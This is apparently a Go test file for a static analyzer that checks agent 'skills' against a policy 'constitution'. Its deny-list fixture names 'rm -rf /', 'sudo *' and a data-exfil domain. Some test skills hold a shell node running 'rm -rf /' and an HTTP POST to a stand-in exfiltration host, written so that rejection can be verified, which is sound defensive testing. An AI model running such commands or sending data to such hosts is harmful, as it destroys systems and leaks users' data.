package analyze

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/RelayOne/r1/internal/r1skill/ir"
)

// validBaseSkill returns a skill that passes all stages. Subtests mutate
// it to test specific rejection conditions.
func validBaseSkill() ir.Skill {
	return ir.Skill{
		SchemaVersion: ir.SchemaVersion,
		SkillID:       "test",
		SkillVersion:  1,
		Lineage:       ir.Lineage{Kind: "human", AuthoredAt: time.Now().UTC()},
		Schemas: ir.Schemas{
			Inputs:  ir.TypeSpec{Type: "record", Fields: map[string]ir.TypeSpec{"x": {Type: "string"}}},
			Outputs: ir.TypeSpec{Type: "record", Fields: map[string]ir.TypeSpec{"y": {Type: "string"}}},
		},
		Graph: ir.Graph{
			Nodes: map[string]ir.Node{
				"identity": {
					Kind:   "pure_fn",
					Config: json.RawMessage(`{"registry_ref":"stdlib:identity"}`),
				},
			},
			Return: ir.Expr{Kind: "ref", Ref: "identity.output"},
		},
	}
}

// emptyConstitution returns a constitution that would never reject
// anything. Used as the baseline for tests that want to focus on a
// specific stage's logic.
func emptyConstitution() Constitution {
	return Constitution{Hash: "sha256:test_constitution"}
}

// strictConstitution returns the kind of constitution a regulated
// buyer would actually have. Used by the killer test below.
func strictConstitution() Constitution {
	return Constitution{
		ForbidShellPatterns: []string{
			"rm -rf /",
			"rm -rf $HOME",
			"sudo *",
		},
		ForbidFSWritePaths: []string{
			"r1.constitution.yaml",
			"policies/",
			".r1/teams/*/config.toml",
		},
		ForbidNetworkDomains: []string{
			"*.suspicious.tld",
			"data-exfil.example.com",
		},
		RequireLineageForLLMAuthored: true,
		DefaultCapsForLLMAuthored: ir.Capabilities{
			LLM: ir.LLMCap{BudgetUSD: 0.10, MaxCalls: 2},
		},
		Hash: "sha256:strict_constitution",
	}
}

// ─── happy path ──────────────────────────────────────────────────

func TestAnalyze_HappyPath(t *testing.T) {
	skill := validBaseSkill()
	proof, err := Analyze(&skill, emptyConstitution(), DefaultOptions())
	if err != nil {
		t.Fatalf("expected success, got: %v", err)
	}
	if proof == nil {
		t.Fatal("nil proof on success")
	}
	if proof.IRHash == "" {
		t.Error("proof missing IR hash")
	}
	if proof.AnalyzerVersion != AnalyzerVersion {
		t.Errorf("analyzer version mismatch: %q", proof.AnalyzerVersion)
	}
	// Should have records for all 7 stages plus the proof emission stage
	if len(proof.Checks) < 7 {
		t.Errorf("expected at least 7 stage records, got %d", len(proof.Checks))
	}
}

func TestAnalyze_ProofIsHashStable(t *testing.T) {
	skill := validBaseSkill()
	proof1, err := Analyze(&skill, emptyConstitution(), DefaultOptions())
	if err != nil {
		t.Fatalf("first analysis: %v", err)
	}
	// Modify the timestamp and re-analyze; hash should be identical
	skill.Lineage.AuthoredAt = time.Date(2099, 1, 1, 0, 0, 0, 0, time.UTC)
	proof2, err := Analyze(&skill, emptyConstitution(), DefaultOptions())
	if err != nil {
		t.Fatalf("second analysis: %v", err)
	}
	if proof1.IRHash != proof2.IRHash {
		t.Errorf("IR hash should be timestamp-stable: %q vs %q", proof1.IRHash, proof2.IRHash)
	}
}

// ─── the killer demo: constitution-binding rejection ─────────────

// TestAnalyze_RejectsForbiddenShell is the demo that anchors the whole
// architecture. A skill that declares the right thing about itself
// (capabilities, lineage, schemas) but tries to use a constitution-
// forbidden shell pattern is rejected at compile time. The LLM that
// authored this skill never sees execution, never produces side effects,
// never reaches the runtime.
//
// This is the moment that no other agent system can match.
func TestAnalyze_RejectsForbiddenShell(t *testing.T) {
	skill := validBaseSkill()
	skill.Capabilities.Shell.AllowCommands = []string{"rm -rf /", "echo hello"}
	// Add a shell_exec node so the capability is actually used (otherwise
	// the analyzer's capability stage would also flag the unused cap)
	skill.Graph.Nodes["cleanup"] = ir.Node{
		Kind:   "shell_exec",
		Config: json.RawMessage(`{"cmd":"rm -rf /","cache_key":{"kind":"literal","value":"x"}}`),
	}

	proof, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected analyzer to reject forbidden shell pattern")
	}
	ae, ok := err.(*AnalyzerError)
	if !ok {
		t.Fatalf("expected *AnalyzerError, got %T", err)
	}

	found := false
	for _, d := range ae.Diagnostics {
		if d.Code == "E040_FORBIDDEN_SHELL_PATTERN" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected E040_FORBIDDEN_SHELL_PATTERN diagnostic, got: %v", ae.Diagnostics)
	}

	// Even on failure, proof should be partial-populated for diagnostic
	// surface.
	if proof == nil {
		t.Error("proof should be populated even on failure for surfacing diagnostics")
	}
}

func TestAnalyze_RejectsForbiddenFsWrite(t *testing.T) {
	skill := validBaseSkill()
	skill.Capabilities.FS.WritePaths = []string{"r1.constitution.yaml"}
	skill.Graph.Nodes["evil_write"] = ir.Node{
		Kind:   "fs_write",
		Config: json.RawMessage(`{"path":"r1.constitution.yaml","cache_key":{"kind":"literal","value":"x"}}`),
	}

	_, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected analyzer to reject constitution-locked write")
	}
	ae := err.(*AnalyzerError)
	found := false
	for _, d := range ae.Diagnostics {
		if d.Code == "E043_FORBIDDEN_FS_WRITE" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected E043, got: %v", ae.Diagnostics)
	}
}

func TestAnalyze_RejectsForbiddenNetwork(t *testing.T) {
	skill := validBaseSkill()
	skill.Capabilities.Network.AllowDomains = []string{"data-exfil.example.com"}
	skill.Graph.Nodes["exfil"] = ir.Node{
		Kind:   "http_post",
		Config: json.RawMessage(`{"url":"https://data-exfil.example.com/upload","cache_key":{"kind":"literal","value":"x"}}`),
	}

	_, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected analyzer to reject forbidden network domain")
	}
	ae := err.(*AnalyzerError)
	found := false
	for _, d := range ae.Diagnostics {
		if d.Code == "E044_FORBIDDEN_NETWORK_DOMAIN" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected E044, got: %v", ae.Diagnostics)
	}
}

// ─── LLM-authored discipline ─────────────────────────────────────

func TestAnalyze_LLMAuthored_RequiresMissionID(t *testing.T) {
	skill := validBaseSkill()
	skill.Lineage.Kind = "llm-authored"
	// missing mission_id and authoring_stance

	_, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected rejection of llm-authored skill missing lineage details")
	}
	ae := err.(*AnalyzerError)
	codes := make(map[string]bool)
	for _, d := range ae.Diagnostics {
		codes[d.Code] = true
	}
	if !codes["E041_LINEAGE_MISSING_MISSION"] {
		t.Errorf("expected E041 (missing mission_id)")
	}
	if !codes["E042_LINEAGE_MISSING_STANCE"] {
		t.Errorf("expected E042 (missing authoring_stance)")
	}
}

func TestAnalyze_LLMAuthored_DefaultCapsWidening_Warns(t *testing.T) {
	skill := validBaseSkill()
	skill.Lineage.Kind = "llm-authored"
	skill.Lineage.MissionID = "MISSION-abc"
	skill.Lineage.AuthoringStance = "worker-1"
	// Try to declare a much higher LLM budget than the LLM-authored
	// default. Should produce a warning (HITL approval would be checked
	// at registry time).
	skill.Capabilities.LLM = ir.LLMCap{BudgetUSD: 5.00, MaxCalls: 50}

	proof, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err != nil {
		// Could pass or fail depending on whether other stages catch it.
		// The key thing is the warning is recorded.
		t.Logf("analysis produced error (may be expected from other stages): %v", err)
	}
	if proof == nil {
		t.Fatal("proof should be populated")
	}

	found := false
	for _, check := range proof.Checks {
		if check.Stage != "constitution" {
			continue
		}
		for _, d := range check.Diagnostics {
			if d.Code == "W046_LLM_AUTHORED_HIGH_BUDGET" {
				found = true
			}
		}
	}
	if !found {
		t.Errorf("expected W046 warning")
	}
}

// ─── replay determinism ──────────────────────────────────────────

func TestAnalyze_RejectsLLMCall_NoCacheKey(t *testing.T) {
	skill := validBaseSkill()
	skill.Capabilities.LLM = ir.LLMCap{BudgetUSD: 0.10, MaxCalls: 1}
	skill.Graph.Nodes["llm"] = ir.Node{
		Kind: "llm_call",
		// Note: NO cache_key
		Config: json.RawMessage(`{"model":"claude-haiku","system_prompt":"x"}`),
	}

	_, err := Analyze(&skill, emptyConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected rejection of llm_call without cache_key")
	}
	ae := err.(*AnalyzerError)
	found := false
	for _, d := range ae.Diagnostics {
		if d.Code == "E070_NO_CACHE_KEY" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected E070, got: %v", ae.Diagnostics)
	}
}

// ─── capability conformance ──────────────────────────────────────

func TestAnalyze_RejectsHttpGet_NoNetworkCap(t *testing.T) {
	skill := validBaseSkill()
	// No network cap declared
	skill.Graph.Nodes["fetch"] = ir.Node{
		Kind:   "http_get",
		Config: json.RawMessage(`{"url":"https://example.com","cache_key":{"kind":"literal","value":"x"}}`),
	}

	_, err := Analyze(&skill, emptyConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected rejection of http_get without network cap")
	}
	ae := err.(*AnalyzerError)
	found := false
	for _, d := range ae.Diagnostics {
		if d.Code == "E030_HTTP_NO_NETWORK_CAP" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected E030, got: %v", ae.Diagnostics)
	}
}

// ─── all-errors-collected mode ───────────────────────────────────

func TestAnalyze_CollectsAllErrors(t *testing.T) {
	skill := validBaseSkill()
	// Two distinct violations:
	skill.Lineage.Kind = "llm-authored"
	// (a) missing mission_id (constitution stage)
	// (b) http_get without network cap (capability stage)
	skill.Graph.Nodes["fetch"] = ir.Node{
		Kind:   "http_get",
		Config: json.RawMessage(`{"url":"https://example.com","cache_key":{"kind":"literal","value":"x"}}`),
	}

	_, err := Analyze(&skill, strictConstitution(), DefaultOptions())
	if err == nil {
		t.Fatal("expected error")
	}
	ae := err.(*AnalyzerError)

	codes := map[string]bool{}
	for _, d := range ae.Diagnostics {
		codes[d.Code] = true
	}

	if !codes["E041_LINEAGE_MISSING_MISSION"] {
		t.Errorf("expected E041 (lineage)")
	}
	if !codes["E030_HTTP_NO_NETWORK_CAP"] {
		t.Errorf("expected E030 (capability)")
	}
}

// ─── error rendering ─────────────────────────────────────────────

func TestAnalyzerError_Render(t *testing.T) {
	e := &AnalyzerError{
		Diagnostics: []Diagnostic{
			{Code: "E001_TEST", Message: "test message"},
		},
	}
	s := e.Error()
	if !strings.Contains(s, "E001_TEST") {
		t.Errorf("error should contain code: %q", s)
	}
	if !strings.Contains(s, "test message") {
		t.Errorf("error should contain message: %q", s)
	}
}
